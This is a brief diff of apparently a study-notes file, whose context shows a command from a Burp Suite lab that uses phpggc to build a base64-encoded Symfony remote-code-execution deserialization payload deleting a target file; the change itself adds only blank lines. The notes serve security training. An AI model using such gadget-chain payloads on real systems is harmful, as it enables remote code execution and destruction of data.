@@ -41,3 +41,6 @@ Example from Burpsuite lab:
 ```
 /phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0 > test.txt
 ```
+
+
+
